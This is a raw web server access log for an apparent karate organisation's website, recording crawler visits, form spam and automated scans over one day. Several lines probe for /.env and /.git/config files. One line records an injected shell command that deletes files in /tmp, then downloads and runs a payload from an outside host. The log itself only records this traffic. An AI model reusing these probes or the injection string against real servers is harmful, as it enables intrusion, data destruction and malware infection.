::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/schools/marinkaratedo.jpeg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/schools/earhartkaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/schools/martinezkaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/schools/manzanitakaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/schools/zoomdonkaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/schools/zoomsfbakaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:157.55.39.26 - - [21/Aug/2022:05:15:24 +0000] "GET /contact.html HTTP/1.1" 404 151 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.55.39.134 - - [21/Aug/2022:05:24:14 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:185.254.196.115 - - [21/Aug/2022:06:01:07 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [21/Aug/2022:06:01:08 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:109.237.103.123 - - [21/Aug/2022:06:07:04 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:46.161.11.238 - - [21/Aug/2022:06:10:51 +0000] "GET / HTTP/1.0" 200 57533 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.44 Safari/537.36 OPR/69.0.3686.7 (Edition beta)"
::ffff:46.161.11.238 - - [21/Aug/2022:06:10:51 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.44 Safari/537.36 OPR/69.0.3686.7 (Edition beta)"
::ffff:46.161.11.238 - - [21/Aug/2022:06:10:52 +0000] "GET /?err=error HTTP/1.0" 200 58085 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.44 Safari/537.36 OPR/69.0.3686.7 (Edition beta)"
::ffff:147.124.208.127 - - [21/Aug/2022:06:20:54 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:147.124.208.127 - - [21/Aug/2022:06:20:55 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:157.55.39.134 - - [21/Aug/2022:06:20:59 +0000] "GET / HTTP/1.1" 200 57533 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:40.77.167.96 - - [21/Aug/2022:06:28:09 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.55.39.245 - - [21/Aug/2022:06:28:18 +0000] "GET / HTTP/1.1" 200 57533 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:45.88.97.214 - - [21/Aug/2022:06:32:05 +0000] "HEAD /?q71fow HTTP/1.1" 200 57533 "http://www.wadokikai.net" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
::ffff:45.88.97.214 - - [21/Aug/2022:06:32:05 +0000] "GET /?q71fow HTTP/1.1" 200 57533 "http://www.wadokikai.net" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
::ffff:135.125.246.189 - - [21/Aug/2022:06:36:33 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [21/Aug/2022:06:36:33 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
- - - [21/Aug/2022:06:39:38 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+networkmapping.xyz/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:66.249.73.120 - - [21/Aug/2022:06:41:27 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.73.120 - - [21/Aug/2022:06:41:27 +0000] "GET /instructors HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:46.161.11.227 - - [21/Aug/2022:06:48:49 +0000] "GET / HTTP/1.0" 200 57533 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 6.3; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:46.161.11.227 - - [21/Aug/2022:06:48:49 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 6.3; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:46.161.11.227 - - [21/Aug/2022:06:48:50 +0000] "GET /?err=error HTTP/1.0" 200 58085 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 6.3; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:157.55.39.134 - - [21/Aug/2022:07:14:25 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:88.214.43.118 - - [21/Aug/2022:07:26:20 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 156 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:157.55.39.134 - - [21/Aug/2022:07:27:46 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:198.235.24.138 - - [21/Aug/2022:07:33:10 +0000] "GET / HTTP/1.0" 200 57533 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:185.254.196.115 - - [21/Aug/2022:07:36:13 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [21/Aug/2022:07:36:13 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:92.38.44.254 - - [21/Aug/2022:07:59:30 +0000] "GET / HTTP/1.1" 200 57533 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::ffff:66.249.65.23 - - [21/Aug/2022:08:08:55 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.19 - - [21/Aug/2022:08:08:55 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.195 - - [21/Aug/2022:08:08:55 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.195 - - [21/Aug/2022:08:08:55 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:135.125.246.189 - - [21/Aug/2022:08:12:35 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [21/Aug/2022:08:12:35 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:3.137.201.234 - - [21/Aug/2022:08:18:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "python-requests/2.28.1"
::ffff:46.161.11.238 - - [21/Aug/2022:08:25:24 +0000] "GET / HTTP/1.0" 200 57533 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:46.161.11.238 - - [21/Aug/2022:08:25:25 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:46.161.11.238 - - [21/Aug/2022:08:25:25 +0000] "GET /?err=error HTTP/1.0" 200 58085 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:104.208.122.74 - - [21/Aug/2022:08:27:33 +0000] "GET /e/data/js/ajax.js HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0"
::ffff:20.216.154.206 - - [21/Aug/2022:08:29:29 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.216.154.206 - - [21/Aug/2022:08:29:30 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:114.119.130.221 - - [21/Aug/2022:08:34:25 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:20.216.154.206 - - [21/Aug/2022:08:38:34 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.216.154.206 - - [21/Aug/2022:08:38:35 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:46.161.11.227 - - [21/Aug/2022:09:02:40 +0000] "GET / HTTP/1.0" 200 57533 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:46.161.11.227 - - [21/Aug/2022:09:02:41 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:46.161.11.227 - - [21/Aug/2022:09:02:42 +0000] "GET /?err=error HTTP/1.0" 200 58085 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:104.208.122.74 - - [21/Aug/2022:09:06:16 +0000] "GET /data/admin/allowurl.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0"
::ffff:185.254.196.115 - - [21/Aug/2022:09:07:27 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [21/Aug/2022:09:07:28 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:157.55.39.134 - - [21/Aug/2022:09:18:06 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.55.39.86 - - [21/Aug/2022:09:25:35 +0000] "GET /docs/Twenty%20guiding%20principles%20of%20Karate.pdf HTTP/1.1" 200 49483 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.55.39.134 - - [21/Aug/2022:09:30:48 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:135.125.246.189 - - [21/Aug/2022:09:42:47 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [21/Aug/2022:09:42:48 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:52.53.248.49 - - [21/Aug/2022:09:48:15 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "python-requests/2.28.1"
::ffff:185.254.196.115 - - [21/Aug/2022:10:38:19 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [21/Aug/2022:10:38:19 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:46.161.11.238 - - [21/Aug/2022:10:40:08 +0000] "GET / HTTP/1.0" 200 57533 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4089.0 Safari/537.36"
::ffff:46.161.11.238 - - [21/Aug/2022:10:40:09 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4089.0 Safari/537.36"
::ffff:46.161.11.238 - - [21/Aug/2022:10:40:09 +0000] "GET /?err=error HTTP/1.0" 200 58085 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4089.0 Safari/537.36"
::ffff:106.75.172.141 - - [21/Aug/2022:10:53:46 +0000] "GET / HTTP/1.0" 200 57533 "-" "-"
::ffff:163.177.13.2 - - [21/Aug/2022:10:58:00 +0000] "GET / HTTP/1.1" 200 57533 "-" "libcurl-agent/7.19.0"
::ffff:2.187.141.186 - - [21/Aug/2022:11:11:15 +0000] "GET / HTTP/1.1" 200 57533 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::ffff:114.119.140.190 - - [21/Aug/2022:11:11:21 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:135.125.246.189 - - [21/Aug/2022:11:12:31 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [21/Aug/2022:11:12:31 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:46.161.11.227 - - [21/Aug/2022:11:15:54 +0000] "GET / HTTP/1.0" 200 57533 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36/iYA9HebN-7"
::ffff:46.161.11.227 - - [21/Aug/2022:11:15:54 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36/iYA9HebN-7"
::ffff:46.161.11.227 - - [21/Aug/2022:11:15:55 +0000] "GET /?err=error HTTP/1.0" 200 58085 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36/iYA9HebN-7"
::ffff:157.55.39.134 - - [21/Aug/2022:11:21:08 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:185.196.220.70 - - [21/Aug/2022:11:33:11 +0000] "GET / HTTP/1.1" 200 57533 "-" "Linux Gnu (cow)"
::ffff:157.55.39.134 - - [21/Aug/2022:11:33:50 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:212.71.233.122 - - [21/Aug/2022:11:40:08 +0000] "GET / HTTP/1.1" 200 57533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:212.71.233.122 - - [21/Aug/2022:11:40:08 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:212.71.233.122 - - [21/Aug/2022:11:40:08 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:212.71.233.122 - - [21/Aug/2022:11:40:10 +0000] "GET / HTTP/1.1" 200 57533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:212.71.233.122 - - [21/Aug/2022:11:40:10 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://34.212.47.6/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:193.118.53.210 - - [21/Aug/2022:11:45:24 +0000] "GET / HTTP/1.1" 200 57533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:66.249.64.69 - - [21/Aug/2022:11:50:54 +0000] "GET / HTTP/1.1" 200 57533 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:185.254.196.115 - - [21/Aug/2022:12:05:50 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [21/Aug/2022:12:05:51 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.216.154.206 - - [21/Aug/2022:12:26:05 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.216.154.206 - - [21/Aug/2022:12:26:05 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:114.119.147.2 - - [21/Aug/2022:12:26:40 +0000] "GET /contact HTTP/1.1" 200 10017 "http://www.wadokikai.net/contact?s=1&ss=5" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:66.249.64.216 - - [21/Aug/2022:12:35:21 +0000] "GET /signup HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:135.125.246.189 - - [21/Aug/2022:12:41:22 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [21/Aug/2022:12:41:22 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.64.216 - - [21/Aug/2022:12:47:01 +0000] "GET /instructors HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:46.161.11.238 - - [21/Aug/2022:12:50:51 +0000] "GET / HTTP/1.0" 200 57533 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4098.0 Safari/537.36"
::ffff:46.161.11.238 - - [21/Aug/2022:12:50:52 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4098.0 Safari/537.36"
::ffff:46.161.11.238 - - [21/Aug/2022:12:50:52 +0000] "GET /?err=error HTTP/1.0" 200 58085 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4098.0 Safari/537.36"
::ffff:157.55.39.160 - - [21/Aug/2022:13:03:03 +0000] "GET /register HTTP/1.1" 404 147 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.55.39.134 - - [21/Aug/2022:13:24:10 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:118.123.105.85 - - [21/Aug/2022:13:27:15 +0000] "GET / HTTP/1.0" 200 57533 "-" "-"
::ffff:118.123.105.85 - - [21/Aug/2022:13:27:16 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
::ffff:118.123.105.85 - - [21/Aug/2022:13:27:16 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
::ffff:118.123.105.85 - - [21/Aug/2022:13:27:17 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 163 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
::ffff:46.161.11.227 - - [21/Aug/2022:13:30:02 +0000] "GET / HTTP/1.0" 200 57533 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36"
::ffff:46.161.11.227 - - [21/Aug/2022:13:30:03 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36"
::ffff:46.161.11.227 - - [21/Aug/2022:13:30:04 +0000] "GET /?err=error HTTP/1.0" 200 58085 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36"
::ffff:207.46.13.74 - - [21/Aug/2022:13:35:11 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
